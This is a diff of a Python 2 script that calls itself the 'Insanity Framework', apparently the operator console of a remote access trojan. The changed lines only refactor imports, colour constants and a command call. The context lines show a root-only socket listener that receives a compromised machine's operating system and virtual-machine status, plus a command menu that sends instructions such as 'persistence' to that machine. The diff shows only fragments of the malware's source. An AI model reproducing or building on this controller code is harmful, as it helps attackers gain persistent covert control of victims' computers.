@@ -7,8 +7,8 @@
 from socket import *
 import os
 import sys
-import base64
-from time import sleep
+from bin.settings import exec_com
+from bin.settings import BLUE, RED, WHITE, GREEN, END
 
 if not os.geteuid() == 0:
     sys.exit('Insanity must be run as root')
@@ -16,10 +16,11 @@ if not os.geteuid() == 0:
 HOST = ''
 PORT = int(raw_input('Tʏᴘᴇ ᴛʜᴇ ᴘᴏʀᴛ: '))
 
-BLUE, RED, WHITE, YELLOW, BOLD, GREEN, END = '\33[94m', '\033[91m', '\33[97m', '\33[93m', '\033[1m', '\033[1;32m', '\033[0m'
 
 def clear():
     os.system('clear')
+
+
 def heading():
 
     sys.stdout.write(RED + '''
@@ -43,6 +44,7 @@ def heading():
                               :                  ʙʏ: ''' + WHITE + '''ᴀʟɪssᴏɴ ᴍᴏʀᴇᴛᴛᴏ(''' + RED + '''4ᴡ4ᴋ3''' + WHITE + ''')''' + RED +  '''                                         
  -- [I]ɴsᴀɴɪᴛʏ [F]ʀᴀᴍᴇᴡᴏʀᴋ  --                            Version: 0.1                
 ''' + END)
+
 
 def pp():
     sys.stdout.write(RED + '''
@@ -74,6 +76,8 @@ $$        #$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
 
 clear()
 heading()
+
+
 def mess():
     print '[*] Oᴘᴇʀᴀᴛɪᴏɴᴀʟ Sʏsᴛᴇᴍ: ' + data2
     if vm == 'True':
@@ -102,6 +106,8 @@ vm = conn.recv(1024)
 #oss = conn.recv(1024)
 
 mess()
+
+
 def help():
     print '''
 - [I]ɴsᴀɴɪᴛʏ [F]ʀᴀᴍᴇᴡᴏʀᴋ -
@@ -113,6 +119,8 @@ def help():
 ᴛʏᴘᴇ {0}ʙᴀᴄᴋ{1} - {0}[{1}ʀᴇᴛᴜʀɴ ᴛᴏ ᴍᴀɪɴ ᴍᴇɴᴜ{0}]{1}
 ᴛʏᴘᴇ {0}ǫᴜɪᴛ{1} - {0}[{1}ᴛᴏᴏʟ ᴇxɪᴛ{0}]{1}
 '''.format(BLUE, END)
+
+
 # start loop
 def main():
     try:
@@ -129,7 +137,7 @@ def main():
             elif command.upper() == 'INFO':
                 mess()
             elif command.upper() == 'BACK':
-                os.system('python2.7 insanity.py')
+                exec_com('insanity.py')
             elif command.upper() == 'PERSISTENCE':
                 try:
                     conn.send('persistence')
@@ -179,6 +187,6 @@ def main():
         pp()
         conn.close()
 
-if __name__ == '__main__':
 
+if __name__ == '__main__':
     main()
